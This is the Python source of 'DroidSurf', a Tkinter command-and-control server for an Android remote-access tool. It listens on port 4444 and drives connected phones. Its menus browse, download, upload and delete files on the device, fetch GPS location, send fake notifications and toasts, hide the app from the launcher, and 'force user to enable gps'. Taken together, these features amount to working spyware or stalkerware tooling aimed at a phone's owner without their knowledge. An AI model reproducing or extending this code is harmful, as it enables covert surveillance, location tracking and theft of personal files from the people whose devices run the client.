from tkinter import *
from datetime import datetime
import socket
import time
import threading
import os
import tkFileDialog as filedialog
import tkMessageBox
import webbrowser

# *****************************************************
# ***** Explicit client commands **********************
def send_data(stringCMD):
	global dataString
	lock.acquire()
	dataString = stringCMD
	lock.release()

# *****************************************************
# ***** Data client sending ***************************
def clientDataSend(socks, activate):
    	global dataString
    	while (dataString==""):
        	print ("Waiting for input..")
        	time.sleep(1)
	socks[activate].send(dataString + "\n")
	dataString = ("")

# *****************************************************
# ***** GPS POS. DATA REQUEST *************************
def devLocationRequest(stringCMD):
	global dataString
	global listbox_gps

	listbox_gps.insert(END, "[>] Requesting positioning data")

	lock.acquire()
	dataString = stringCMD
	lock.release()
    
# *****************************************************
# ***** GPS POS. DATA ITEM CLICK EVENT ****************
def onItemSelectedGps(evt):
	try:
		w = evt.widget
		index = int(w.curselection()[0])
		value = w.get(index)

		if (value.startswith("[+] "))==True:
			webbrowser.open("https://www.google.com/maps/search/?api=1&query=" + value[4:])

		print '[+] Selected item %d: "%s"' % (index, value)
	except:
		print '[+] List is empty'    
    

# *****************************************************
# ***** Initializing connection with client ***********
def client_connection(clients, socks):
	try:
		selected = listbox_1.get(listbox_1.curselection())
		activate = int(selected[0])
		activate -= 1
		session_st = ("4vv10_53ss10n\n")
		socks[activate].send(session_st)
		thread_1 = threading.Thread(name="connection", target=client_connection_thread, args=(clients, socks, selected, activate))
        	thread_1.start()            
            	connectButton.config(state="disabled")
	except:
		pass

# ******************************************************
# ***** THREAD_0 ##### Mainloop client list update *****
def server_mainloop(clients, socks, interval):
	global stopThread
	print ("[+] Main thread client list updates [ STARTED ]")    
	while (stopThread==False):
		if stopUpdate:
			print "[+] Client list updates [ STOPPED ]"
			time.sleep(5)
		else:
			print "[+] Client list updates [ RUNNING ]"
			refresh(clients)
        	try:
			c.settimeout(10)
			try:
				s,a = c.accept()
			except socket.timeout:
				continue
			if (a):
				s.settimeout(None)
				cli_hostname = s.recv(1024)
				socks += [s]
				clients += [str(a)+"~"+cli_hostname]
			refresh(clients)
			time.sleep(interval)
		except:
			continue

# ***********************************************************
# ***** THREAD_0 ##### Mainloop - refresh client list *******
def refresh(clients):
    listbox_1.delete(0,END)
    if len(clients) > 0:
        for i in range(0,len(clients)):
            listbox_1.insert(END, str((i+1)) + "~" + clients[i])

# ************************************************************
# ***** THREAD_0 ##### Mainloop - onClick event stops loop ***
def onClientSelected(evt):
	try:
		w = evt.widget
		index = int(w.curselection()[0])
		value = w.get(index)

		# **** # # # # # # STOP ------>> [ THREAD_0 ]

		global stopUpdate
		stopUpdate = True

		# *******************************************

		print '[+] Selected item %d: "%s"' % (index, value)
	except:
		print '[+] List is empty'

# *************************************************************
# ***** THREAD_1 ##### Single client negoziation mainloop *****

def client_connection_thread(clients, socks, selected, activate):
	disconnectButton.config(state="active")
        statusBar.config(text=("Connected to client " + selected), bg="green")
        now = datetime.now()
        listbox_2.insert(0, "[+] " + now.strftime("%H:%M:%S %d/%m/%Y") + " Connection established with client " + selected[2:])
        
	# Get user selected item in listbox.
	while True:
		try:
			socks[activate].settimeout(15)
			data = socks[activate].recv(1024)
 # - - - - - - - - - - - - - - - - - - -- - - - -- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - *****
			#listbox_2.insert(0, "[Client]:"+data)

			print("[From client]>"+data)

			# ***** Received data string check *****
			if data.endswith("FEOFEOFEOFEOFEOX")==True:
				print("[+] Data received correctly")

				if (data[:-16]=="disconnect" or data==""):
					print("[!] CLIENT DISCONNECTED")

					global stopUpdate
                                        now = datetime.now()
                    			listbox_2.insert(0, "[+] " + now.strftime("%H:%M:%S %d/%m/%Y") + " Device disconnected from host")
                                        statusBar.config(bg="lightblue", text=("Listening for incoming connections on [" + ip_host + " | " + str(SRVPORT)) + "]")
					listbox_1.delete(0,END)
					stopUpdate = False
					connectButton.config(state="active")
					disconnectButton.config(state="disabled")
					socks[activate].close()
					socks.remove(socks[activate])
					clients.remove(clients[activate])
					time.sleep(1)
					break

				if data.startswith("Updated Location: ")==True:
					listbox_gps.insert(END, "[+] " + data[18:-16])

				if data.startswith("!02KJP10")==True:
					now = datetime.now()
                                        listbox_2.insert(0, "[+] " + now.strftime("%H:%M:%S %d/%m/%Y") + " File has been deleted")
					send_data(stringCMD="!r3Fre$!")

				if data.startswith("7!HKOX59")==True:
                                        listbox_2.insert(0, "[+] File renamed.")
					send_data(stringCMD="!r3Fre$!")

				if data.startswith("!N0GP54CT!")==True:
					listbox_gps.delete(0, END)
					now = datetime.now()
                                        listbox_gps.insert(0, "[>] " + now.strftime("%H:%M:%S %d/%m/%Y") + " gps provider: NOT ACTIVE")

                		if data.startswith("?R34D!N0W1")==True:
					global gpsButton
					listbox_gps.delete(0, END)
					now = datetime.now()
                                        listbox_gps.insert(0, "[>] " + now.strftime("%H:%M:%S %d/%m/%Y") + " gps provider: ACTIVE")
					gpsButton.config(state="active")
                                        
                		if data.startswith("J3F703B4!A")==True:
                                        listbox_gps.insert(0, "[+] Localization service is already running")
                                        
                        	if data.startswith("5CR33NSTAT")==True:
                                        now = datetime.now()
                                        listbox_2.insert(0, "[+] " + now.strftime("%H:%M:%S %d/%m/%Y") + " Device screen is: " + data[10:-16])

				if data.startswith("G401BNHMSC")==True:
                                        now = datetime.now()
					listbox_2.insert(0, "[+] " + now.strftime("%H:%M:%S %d/%m/%Y") + " Client version: " + data[10:-16])
                                
				# --- # SENDING DATA TO CLIENT # --- #
				clientDataSend(socks, activate)

			else:

                		if data.startswith("!F1L3BR0WS3RX!")==True:
                                        now = datetime.now()
                                        listbox_2.insert(0, "[+] " + now.strftime("%H:%M:%S %d/%m/%Y") + " Received file listing data")

					global listbox_fb
					listbox_fb.delete(0,END)

					mainDirString = ("")
					
					while data.endswith("FEOFEOFEOFEOFEOX")==False:
						data = socks[activate].recv(1024)
						#print data
						mainDirString = (mainDirString + data)
					
					#print (mainDirString)
					mainDirString = mainDirString[:-16]
					h = mainDirString.split("#d0b#")

					# remove first empty space
     					h = h[1:]
					for l in h:
						listbox_fb.insert(END, l)

					
					data = ("filedataFEOFEOFEOFEOFEOX")
					
					clientDataSend(socks, activate)


                		if data.startswith("!PrepareNowForDownload!")==True:
					try:
						print("[+] Starting download")
                        			filename = data[23:]
						f = open(filename,"wb")

						while True:
							l = socks[activate].recv(1024)
							
							if l.endswith("0001endtransmission0001FEOFEOFEOFEOFEOX"):
								print("CORRECT-EXIT")
                                                                now = datetime.now()               
                                				listbox_2.insert(0, "[+] " + now.strftime("%H:%M:%S %d/%m/%Y") + " File successfully downloaded: " + filename)						
								listbox_2.itemconfig(0, bg='green')
                                                
								f.write(l[:-39])
								f.close()
								clientDataSend(socks, activate)
								break                                
							else:
								f.write(l)

					except socket.timeout(10):
						print("File transfer error")
						pass


				if data.startswith("!Upl0ad1nProgre$")==True:
					print ("Received message - upload starting...")

					global MemPathUpload
					filename = MemPathUpload								
					if os.path.exists(filename):
						f = open(filename,"rb")								
						l = f.read(1024)
						
						while (l):
							socks[activate].send(l)
							l = f.read(1024)

						f.close()

						time.sleep(3.0)						

                                                now = datetime.now()
						listbox_2.insert(0, "[+] " + now.strftime("%H:%M:%S %d/%m/%Y") + " Upload " + filename + " completed")

						print("---> Closing the socket <---")

						socks[activate].close()
						clients.remove(clients[activate])
						socks.remove(socks[activate])

						stopUpdate = False
						connectButton.config(state="active")
						disconnectButton.config(state="disabled")
						
						listbox_fb.delete(0,END)
						listbox_fb.insert(0," File uploaded successfully")
						listbox_fb.insert(END," please reconnect to client")
						listbox_fb.insert(END," and press the 'HOME' button")
                        
                            			listbox_fb.itemconfig(0, bg='green')
                            			listbox_fb.itemconfig(1, bg='green')
                            			listbox_fb.itemconfig(2, bg='green')                        

						time.sleep(1.0)
						break


						#clientDataSend(socks, activate)

					else:	
						print ("File non trovato o inesistente")


				if not(data):
					print("[!] NO DATA")				
					now = datetime.now()
                    			listbox_2.insert(0, "[+] " + now.strftime("%H:%M:%S %d/%m/%Y") + " Client disconnected from host")
                                        statusBar.config(bg="lightblue", text=("Listening for incoming connections on [" + ip_host + " | " + str(SRVPORT)) + "]")
					listbox_1.delete(0,END)
					stopUpdate = False
					connectButton.config(state="active")
					disconnectButton.config(state="disabled")
					socks[activate].close()
					socks.remove(socks[activate])
					clients.remove(clients[activate])
					time.sleep(1)
					break
               
				else:
					print("Error: " + data)
			
		except (socket.timeout, socket.error):
			print("[!] SOCKET ERROR OR TIMEOUT")
                        now = datetime.now()
                    	listbox_2.insert(0, "[+] " + now.strftime("%H:%M:%S %d/%m/%Y") + " Client disconnected from host")
                        statusBar.config(bg="lightblue", text=("Listening for incoming connections on [" + ip_host + " | " + str(SRVPORT)) + "]")
			listbox_1.delete(0,END)
			stopUpdate = False
			connectButton.config(state="active")
			disconnectButton.config(state="disabled")
			socks[activate].close()
			socks.remove(socks[activate])
			clients.remove(clients[activate])
			time.sleep(1)
			break

# ******************************************
# ***** FILE DOWNLOADER ********************

def fileDownload(stringCMD):
    global dataString
    global listbox_fb
    try:
        selected_fb = listbox_fb.get(listbox_fb.curselection())
        lock.acquire()
        dataString = (stringCMD + selected_fb)
        lock.release()
    except:
        print("[!] Error occurred while downloading")
        
# ******************************************
# ***** FILE UPLOADER **********************

def fileUpload(stringCMD):
    	global dataString
        global MemPathUpload
	global listbox_fb

    	# Open file browser dialog on computer. rep is a tuple value
    	rep = filedialog.askopenfilenames(parent=root, initialdir='/', initialfile='tmp', filetypes=[("All files", "*"), ("PNG", "*.png"), ("JPEG", "*.jpg"), ("MP4", "*.mp4"), ("APK", "*.apk"), ("XML", "*.xml")])
    
    	PathUploadFilename = (rep[0])
    	UploadFilename = (rep[0].split("/"))[-1]

    	# Send we want start download + filename
    	lock.acquire()
        MemPathUpload = PathUploadFilename
    	dataString = (stringCMD + UploadFilename)
    	lock.release()	

	#**** upload in progress please wait...

	listbox_fb.delete(0,END)
	listbox_fb.insert(0," UPLOADING IN PROGRESS")
	listbox_fb.insert(END," please wait...")
                        
	listbox_fb.itemconfig(0, bg='lightblue')
	listbox_fb.itemconfig(1, bg='lightblue')




def navUpLevel(stringCMD):
        global dataString
	try:
        	selected_fb = listbox_fb.get(listbox_fb.curselection())
        	lock.acquire()
    		dataString = (stringCMD + selected_fb)
    		lock.release()            
	except:
		print 'Access denied'

# ***** FILE BROWSER GUI *****
def fileBrowser(stringCMD):

        global dataString
        global listbox_fb 

    	rootFilebrowser = Toplevel()
    	rootFilebrowser.title("File browser")
    	rootFilebrowser.geometry("400x560")
        rootFilebrowser.iconbitmap(iconpath)
        rootFilebrowser.attributes('-alpha', 0.0)
    	rootFilebrowser.resizable(False, False)
    
    	menu_fb = Menu(rootFilebrowser, background='#000099', foreground='lightgreen', activebackground='#004c99', activeforeground='lightgreen')
    	rootFilebrowser.config(menu=menu_fb)
    
    	subMenu_fb = Menu(menu_fb, tearoff=0, background='#000099', foreground='lightgreen', activebackground='#004c99', activeforeground='lightgreen')
    	menu_fb.add_cascade(label="Options", menu=subMenu_fb)
    	subMenu_fb.add_command(label="Download file", command = lambda: fileDownload(stringCMD="InputStartDownload"))
    	subMenu_fb.add_command(label="Upload file", command = lambda: fileUpload(stringCMD="InputStartUpload"))
    	subMenu_fb.add_command(label="Rename file", command=renameFileMenu)
	subMenu_fb.add_command(label="Delete file", command= lambda: deleteSingleFile(stringCMD="!d3lET3!"))

    
    	frame_fb = Frame(rootFilebrowser)
    	frame_fb.pack(fill=X)
    
    	listbox_fb = Listbox(frame_fb, selectmode=SINGLE, height=25, font=("Consolas", 12, "bold"))
    	listbox_fb.pack(side=TOP, fill=BOTH, expand=True)
        #listbox_fb.bind("<<ListboxSelect>>", onFileSelected)
        listbox_fb.insert(0, "Receiving data...")
    
    	frame_fb2 = Frame(rootFilebrowser)
    	frame_fb2.pack(side=BOTTOM, fill=Y)
    
        home_fb = Button(frame_fb2, width=15, height=2, text="HOME", bg="lightgreen", font=("Helvetica", 10, "bold"), command = lambda: send_data(stringCMD="startLocalFileBrowserNowBackHome"))
        home_fb.pack(side=LEFT, padx=5)    
        up_fb = Button(frame_fb2, width=15, height=2, text="GO", bg="lightblue", font=("Helvetica", 10, "bold"), command = lambda: navUpLevel(stringCMD="startLocalFileBrowserNowUpLevel"))
    	up_fb.pack(side=LEFT, padx=5)

        rfsh_fb = Button(frame_fb2, width=6, height=2, text="Refresh", bg="yellow", font=("Helvetica", 10, "bold"), command = lambda: send_data(stringCMD="!r3Fre$!"))
    	rfsh_fb.pack(side=LEFT, padx=5)

    
    	# SEND: startLocalFileBrowser to CLIENT input
    	lock.acquire()
    	dataString = (stringCMD)
    	lock.release()
        
        center(rootFilebrowser)
        rootFilebrowser.attributes('-alpha', 1.0)
        rootFilebrowser.mainloop()


# ***** GPS LOCATION GUI *****
def findDevice(stringCMD):

	global dataString
    	global listbox_gps
	global gpsButton

   	rootGps = Toplevel(bg="lightgrey")
   	rootGps.title("Find device")
        rootGps.iconbitmap(iconpath)
	rootGps.attributes('-alpha', 0.0)
    	rootGps.geometry("420x240")
        
    	rootGps.resizable(False, False)

    	menu_gps = Menu(rootGps)
        rootGps.config(menu=menu_gps)
        subMenu_gps = Menu(menu_gps)
        menu_gps.add_cascade(label="Options", menu=subMenu_gps)
        subMenu_gps.add_command(label="Show last device location", command= lambda: send_data(stringCMD="pipipipi"))
        subMenu_gps.add_command(label="Force user to enable gps", command= lambda: send_data(stringCMD="checkScreenStatus"))
            
    	frame_gps = Frame(rootGps, bg="lightgrey")
    	frame_gps.pack(fill=X)
    
    	listbox_gps = Listbox(frame_gps, selectmode=SINGLE, height=10, font=("Helvetica", 10, "bold"))
    	listbox_gps.pack(side=TOP, fill=X, expand=True)
	listbox_gps.bind("<<ListboxSelect>>", onItemSelectedGps)
	listbox_gps.insert(0, "Verifying if gps provider is enabled...")

    	gpsButton = Button(frame_gps, text="Locate device", bg="lightgreen", width=30, command= lambda: devLocationRequest(stringCMD="!g3tp0sl0cd3v10!"))
    	gpsButton.pack(side=BOTTOM, pady=5)
	gpsButton.config(state="disabled")

    	# SEND: startLocalFileBrowser to CLIENT input
    	lock.acquire()
    	dataString = (stringCMD)
    	lock.release()

        
        center(rootGps)
        rootGps.attributes('-alpha', 1.0)
        rootGps.mainloop()
    
    
# ***** COMMANDS WINDOW *****
def otherCommands():
    otherCmds = Toplevel(bg="lightgrey")
    otherCmds.title("Menu")
    otherCmds.geometry("210x160")
    otherCmds.iconbitmap(iconpath)
    otherCmds.attributes('-alpha', 0.0)
    otherCmds.resizable(False, False)
    
    frame_cmds = Frame(otherCmds, bg="lightgrey")
    frame_cmds.pack(pady= 5, fill=X)
    
    bt0_cmds = Button(frame_cmds, text="Start ring", bg="lightblue", command= lambda: send_data(stringCMD="ph0neRingSt4rt"))
    bt1_cmds = Button(frame_cmds, text="Stop ring", bg="lightblue", command= lambda: send_data(stringCMD="ph0neRingSt4rt0FF"))
    bt2_cmds = Button(frame_cmds, text="Fake notification", bg="lightblue", command= lambda: send_data(stringCMD="!phoneNotification!"))
    bt3_cmds = Button(frame_cmds, text="Check display status", bg="lightblue", command= lambda: send_data(stringCMD="checkScreenStatus"))
    #bt4_cmds = Button(frame_cmds, text="Read contacts", bg="lightblue", command= lambda: send_data(stringCMD="12345678"))
        
    bt0_cmds.pack(side=TOP, pady=5, padx=5, fill=X)
    bt1_cmds.pack(side=TOP, pady=5, padx=5, fill=X)
    bt2_cmds.pack(side=TOP, pady=5, padx=5, fill=X)
    bt3_cmds.pack(side=TOP, pady=5, padx=5, fill=X)
    #bt4_cmds.pack(side=TOP, pady=5, padx=5, fill=X)

    center(otherCmds)
    otherCmds.attributes('-alpha', 1.0)
    otherCmds.mainloop()


# ***** SEND TOAST MSG *****
def sendToastMsg():
	def btn_send_toast(stringCMD):
		global dataString
		lock.acquire()
    		toastMsg = entry_msg.get()
		dataString = (stringCMD + toastMsg)
		print("msg: " + dataString)
		lock.release()
		entry_msg.delete(0, END)

    	rootMsg = Toplevel()
    	rootMsg.title("Send toast")
        rootMsg.iconbitmap(iconpath)
    	rootMsg.geometry("250x80")
        rootMsg.attributes('-alpha', 0.0)
        rootMsg.resizable(False, False)

    	label_msg = Label(rootMsg, text="Enter toast message", font=("Helvetica", 10, "bold"))
    	frame_msg0 = Frame(rootMsg, padx=5, pady=5)
    	entry_msg = Entry(frame_msg0, width=30)   
    	button_msg = Button(frame_msg0, text="SEND", bg="lightgreen", font=("Helvetica", 10, "bold"), command= lambda: btn_send_toast(stringCMD="showtoastmsg"))
	
    	label_msg.pack(side=TOP, fill=X)
    	frame_msg0.pack(side=TOP, fill=X)
	entry_msg.pack(side=LEFT, fill=X) 
	button_msg.pack(side=RIGHT, padx=5)
    
        center(rootMsg)
        rootMsg.attributes('-alpha', 1.0)
    	rootMsg.mainloop()


# ***** SEND NOTIFICATION *****
def sendNotificationMsg():
	def btn_send_notification(stringCMD):
		global dataString
		lock.acquire()

    		notMsg = not_msg.get()
		notMsg2 = not_msg2.get()

		dataString = (stringCMD + notMsg + "h#g!" + notMsg2)

		print("notification: " + dataString)
		lock.release()
		not_msg.delete(0, END)
		not_msg2.delete(0, END)

    	rootNot = Toplevel()
    	rootNot.title("Sending")
        rootNot.iconbitmap(iconpath)
    	rootNot.geometry("250x120")
        rootNot.attributes('-alpha', 0.0)
        rootNot.resizable(False, False)

    	label_not = Label(rootNot, text="Enter notification message", font=("Helvetica", 10, "bold"))

    	frame_not0 = Frame(rootNot, padx=5, pady=5)
	label_title = Label(frame_not0, text="Title", fg="blue", font=("Helvetica", 10, "italic"))
	not_msg = Entry(frame_not0, width=30)


	frame_not1 = Frame(rootNot, padx=5, pady=5)
	label_body = Label(frame_not1, text="Body", fg="red", font=("Helvetica", 10, "italic"))
	not_msg2 = Entry(frame_not1, width=30)

	frame_not2 = Frame(rootNot, padx=5, pady=5)
    	button_not = Button(frame_not2, text="SEND", bg="lightgreen", font=("Helvetica", 10, "bold"), command= lambda: btn_send_notification(stringCMD="N0T1F!C4"))
	

	label_not.pack(side=TOP, fill=X)

	frame_not0.pack(side=TOP, fill=X)
	label_title.pack(side=LEFT)
	not_msg.pack(side=RIGHT, fill=X)

	frame_not1.pack(side=TOP, fill=X)
	label_body.pack(side=LEFT)
	not_msg2.pack(side=RIGHT, fill=X)
	

	frame_not2.pack(side=TOP, fill=X)
	button_not.pack(side=RIGHT, padx=2)	
    
        center(rootNot)
        rootNot.attributes('-alpha', 1.0)
    	rootNot.mainloop()


# ***** CLEAR CLIENT GUI LOGS ********
def clearClientLogs():
    	listbox_2.delete(0,END)


# ***** DELETE FILE *******
def deleteSingleFile(stringCMD):
	global dataString
	global listbox_fb
	global listbox_2

	lock.acquire()

	try:
		selected_fb = listbox_fb.get(listbox_fb.curselection())
		dataString = (stringCMD + selected_fb)
		print ("Deleted: " + selected_fb)

		now = datetime.now()
		listbox_2.insert(0, "[+] " + now.strftime("%H:%M:%S %d/%m/%Y") + " File: " + selected_fb + " deleted")

	except:
		now = datetime.now()
		listbox_2.insert(0, "[+] " + now.strftime("%H:%M:%S %d/%m/%Y") + " Error deleting file: " + selected_fb + " try again")

	lock.release()


# ***** RENAME FILE MENU ******
def renameFileMenu():

	def btn_rename_file(stringCMD):
		global dataString
		global listbox_fb

		lock.acquire()
		selected_fb = listbox_fb.get(listbox_fb.curselection())
    		newFileName = entry_Rename.get()
		dataString = (stringCMD + selected_fb + "!0101!" + newFileName)
		print("msg: " + dataString)
		lock.release()
		entry_Rename.delete(0, END)


    	rootrenameFileMenu = Toplevel()
    	rootrenameFileMenu.title("Rename")
    	rootrenameFileMenu.geometry("220x100")
        rootrenameFileMenu.iconbitmap(iconpath)
        rootrenameFileMenu.attributes('-alpha', 0.0)
    	rootrenameFileMenu.resizable(False, False)

    	labelRenameFile = Label(rootrenameFileMenu, text="Enter new file name", font=("Helvetica", 10, "bold"))    
    	entry_Rename = Entry(rootrenameFileMenu)
    	bt_sendRenamedFile = Button(rootrenameFileMenu, text="Rename", bg="lightgreen", font=("Helvetica", 10, "bold"), width=15, height=2, command= lambda: btn_rename_file(stringCMD="!enmF1L3"))

    	labelRenameFile.pack(side=TOP, pady=5, fill=X)
    	entry_Rename.pack(side=LEFT, padx=10, fill=X)
    	bt_sendRenamedFile.pack(side=LEFT, pady=10, padx=5, fill=X)
        
        center(rootrenameFileMenu)
        rootrenameFileMenu.attributes('-alpha', 1.0)

	rootrenameFileMenu.mainloop()


# ***** HIDE APP SETTINGS *****
def openHideSettings():
    hideSettings = Toplevel()
    hideSettings.title("Hide app settings")
    hideSettings.geometry("280x100")
    hideSettings.attributes('-alpha', 0.0)
    hideSettings.iconbitmap(iconpath)
    hideSettings.resizable(False, False)

    frame_stgs = Frame(hideSettings)
    frame_stgs.pack(fill=X)    
    
    label_hide = Label(hideSettings, text="Hide application from app launcher", font=("Helvetica", 10, "bold"))
    button_hide = Button(hideSettings, text="Hide/Unhide app", width=20, height=1, bg="blue", command= lambda: send_data(stringCMD="!H1D34PP"), fg="lightgreen")
    
    label_hide.pack(side=TOP, anchor=NW, fill=X)
    button_hide.pack(side=TOP, anchor=N)
    
    center(hideSettings)
    hideSettings.attributes('-alpha', 1.0)
    hideSettings.mainloop()



# ***** SERVER NETWORK SETTINGS *****
def openSettings():
    def popupMsg():
        portNumber = entry_stgs.get()
        
        if os.path.exists(settings):
            f = open(settings,"wb")
            l = f.write("port=" + portNumber)           
            f.close()

            entry_stgs.delete(0, END)
            tkMessageBox.showinfo("Info", "Settings successfully changed. Please restart.")
            _delete_window()
		
        else:
            print ("[+] Error. Settings.ini not found. Please restart application.")
            _delete_window()

    rootSettings = Toplevel()
    rootSettings.title("Network settings")
    rootSettings.geometry("280x100")
    rootSettings.attributes('-alpha', 0.0)
    rootSettings.iconbitmap(iconpath)
    rootSettings.resizable(False, False)
    
    frame_stgs = Frame(rootSettings)
    frame_stgs.pack(fill=X)    
    
    label0_stgs = Label(rootSettings, text="Enter new server listening port", font=("Helvetica", 10, "bold"))    
    entry_stgs = Entry(rootSettings, width=15, justify="center")
    button_stgs = Button(rootSettings, text="SAVE", font=("Helvetica", 10, "bold"), bg="lightgreen", width=20, height=2, command=popupMsg)  
    
    label0_stgs.pack(side=TOP, anchor=NW, fill=X)
    entry_stgs.pack(side=TOP, padx=5)
    button_stgs.pack(side=BOTTOM, pady=10)
    
    entry_stgs.insert(0, str(SRVPORT))
    
    center(rootSettings)
    rootSettings.attributes('-alpha', 1.0)
    rootSettings.mainloop()


def openWebBrowser():
    webbrowser.open("http://androidsurfer.altervista.org")

# ***** Program Info *****
def openInfo():
    rootInfo = Toplevel()
    rootInfo.title("Info")
    rootInfo.geometry("280x110")
    rootInfo.attributes('-alpha', 0.0)
    rootInfo.iconbitmap(iconpath)
    rootInfo.resizable(False, False)
    
    frame_stgs = Frame(rootInfo)
    frame_stgs.pack(fill=X)    
    
    label_info1 = Label(rootInfo, text="DroidSurf", font=("Helvetica", 10, "bold"), fg="red")
    label_info2 = Label(rootInfo, text="version 1.0.2", font=("Helvetica", 10, "bold"))
    label_info3 = Label(rootInfo, text="Malcolm Mami", font=("Helvetica", 10))

    button_info = Button(rootInfo, text="Check for updates", font=("Helvetica", 10, "bold"), bg="lightgreen", width=15, height=1, command=openWebBrowser)    
    
    label_info1.pack(side=TOP, anchor=NW, fill=X)
    label_info2.pack(side=TOP, anchor=NW, fill=X)
    label_info3.pack(side=TOP, anchor=NW, fill=X)

    button_info.pack(side=BOTTOM, pady=10)
    

    
    center(rootInfo)
    rootInfo.attributes('-alpha', 1.0)
    rootInfo.mainloop()







def portCheck(SRVPORT,settings):
    if os.path.exists(settings):
            print("[+] Settings file has been found")
            # read settings file
            f = open(settings,'rb')
            r = f.read()
            f.close()
            # change the default port
            SRVPORT = int(r[5:])

    else:
        f = open(settings,"wb")
        l = f.write("port="+str(SRVPORT))
        f.close()
        print("[+] Settings file generated - default listening port is " + str(SRVPORT))
        listbox_2.insert(0, "[+] Settings file generated - default listening port is " + str(SRVPORT))
        
    return SRVPORT

def forceAppExit():
	script_name = os.path.basename(sys.argv[0])
	print ("Nome dello script: " + script_name)
	
	kill_string = ("taskkill /f /im " + script_name)
	os.system(kill_string)

def _delete_window():
	global stopThread
	print "[+] Stopping.."
	forceAppExit()
	try:
		root.destroy()
		stopThread = True
	        sys.exit()
    	except:
        	pass

def check_settings_file(SRVPORT):
    if os.path.exists(settings)==False:
            f = open(settings,"wb")
            l = f.write("port=" + str(SRVPORT))
            f.close()
	    time.sleep(1.0)
    else:
        pass

# ****** CENTER WINDOWS ON SCREEN ******
def center(win):
    """
    centers a tkinter window
    :param win: the root or Toplevel window to center
    """
    win.update_idletasks()
    width = win.winfo_width()
    frm_width = win.winfo_rootx() - win.winfo_x()
    win_width = width + 2 * frm_width
    height = win.winfo_height()
    titlebar_height = win.winfo_rooty() - win.winfo_y()
    win_height = height + titlebar_height + frm_width
    x = win.winfo_screenwidth() // 2 - win_width // 2
    y = win.winfo_screenheight() // 2 - win_height // 2
    win.geometry('{}x{}+{}+{}'.format(width, height, x, y))
    win.deiconify()        

# *********************************
# ****** WORKING DIR **************
wpath = os.getcwd()
iconpath = (wpath + "\configs\\app_icon.ico")
settings = (wpath + "\configs\\settings.ini")
# *********************************
# *********************************
# ***** CONNECTION PARAMETERS *****
SRVADDR = "0.0.0.0"
SRVPORT = 4444

# *********************************
# *********************************
# ***** GLOBAL VARIABLES **********
MemPathUpload = ""
dataString = ""
stopUpdate = False
stopThread = False

# *********************************
# *********************************
# ***** CLIENT VARIABLES **********
clients = []
socks = []
interval = 0.8
lock = threading.Lock()

# **********************************
# **********************************
# ***** SETTINGS FILE **************
check_settings_file(SRVPORT)


# **********************************
# **********************************
# ***** LISTEN PORT CHECK **********
ck = portCheck(SRVPORT,settings)
SRVPORT = ck

# **********************************
# **********************************
# ********* COMPUTER INFO **********
pc_name = socket.gethostname()
ip_host = socket.gethostbyname(pc_name)

# **********************************
# **********************************
# ***** SERVER BOOT ****************
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.bind((SRVADDR, SRVPORT))
c.listen(512)

print("[+] Server listening on " + SRVADDR + ":" + str(SRVPORT))


# **********************************
# **********************************
# ***** TKINTER MAIN WINDOW ********
root = Tk()
root.title("DroidSurf")
root.geometry("800x580")
root.iconbitmap(iconpath)
root.attributes('-alpha', 0.0)
root.resizable(False, False)
root.protocol("WM_DELETE_WINDOW", _delete_window)

# *********************
# ***** Main Menu *****
menu = Menu(root, background='#000099', foreground='lightgreen', activebackground='#004c99', activeforeground='lightgreen')
root.config(menu=menu)

subMenu = Menu(menu, tearoff=0, background='#000099', foreground='lightgreen', activebackground='#004c99', activeforeground='lightgreen')
menu.add_cascade(label="File", menu=subMenu)
subMenu.add_command(label="Settings", command=openSettings)
subMenu.add_command(label="Info", command=openInfo)
subMenu.add_separator()
subMenu.add_command(label="Exit", command=_delete_window)

subMenu2 = Menu(menu, tearoff=0, background='#000099', foreground='lightgreen', activebackground='#004c99', activeforeground='lightgreen')
menu.add_cascade(label="Device", menu=subMenu2)
subMenu2.add_command(label="File browser", command = lambda: fileBrowser(stringCMD="startLocalFileBrowser"))
subMenu2.add_command(label="Send toast", command=sendToastMsg)
subMenu2.add_command(label="Commands", command=otherCommands)
subMenu2.add_command(label="Device info", command = lambda: send_data(stringCMD="!ph0ne1me1!"))
subMenu2.add_command(label="Hide app", command=openHideSettings)
subMenu2.add_command(label="Notification", command=sendNotificationMsg)
subMenu2.add_separator()
subMenu2.add_command(label="Find device", command = lambda: findDevice(stringCMD="getdevgpslocation"))

# ***** Toolbar *****
toolbar = Frame(root)

label_0 = Label(root, text="Devices", font=("Helvetica", 10, "bold"))
label_0.pack(side=TOP)

disconnectButton = Button(toolbar, text="Disconnect", command= lambda: send_data(stringCMD="disconnect"), bg="lightblue", font=("Helvetica", 10, "bold"))
disconnectButton.pack(side=RIGHT, padx=5)
disconnectButton.config(state="disabled")

connectButton = Button(toolbar, text="Connect", command= lambda: client_connection(clients, socks), bg="lightgreen", font=("Helvetica", 10, "bold"))
connectButton.pack(side=RIGHT, padx=5)

toolbar.pack(side=TOP, fill=X)

# ***** Statusbar *****
statusBar = Label(root, bg="lightblue", text=("Listening for incoming connections on [" + ip_host + " | " + str(SRVPORT)) + "]", font=("Consolas", 10, "normal"), bd=1, relief=SUNKEN, anchor=W)
statusBar.pack(side=BOTTOM, fill=X)

# ***** Client list listbox *****
frame_1 = Frame(root)
frame_1.pack(fill=X)

listbox_1 = Listbox(frame_1, selectmode=SINGLE, height=9, font=("Consolas", 12, "normal"))
listbox_1.pack(side=LEFT, fill=X, expand=True)
listbox_1.bind("<<ListboxSelect>>", onClientSelected)


label_1 = Label(root, text="Log", font=("Helvetica", 10, "bold"))
label_1.pack(side=TOP)

frame_2 = Frame(root)
frame_2.pack(fill=X)

listbox_2 = Listbox(frame_2, selectmode=SINGLE, height=15, font=("Helvetica", 10))
listbox_2.pack(side=LEFT, fill=X, expand=True)

frame_3 = Frame(root)
frame_3.pack(fill=X)

clearButton = Button(frame_3, text="Clear log", command=clearClientLogs, bg="lightblue", font=("Helvetica", 10, "bold"))
clearButton.pack(side=RIGHT, padx=5)

# ***** Start Mainloop *****
thread_0 = threading.Thread(target=server_mainloop, args=(clients, socks, interval))
thread_0.start()

# ***** WIN CENTER *******
center(root)
root.attributes('-alpha', 1.0)
# ***** GUI Mainloop *****
root.mainloop()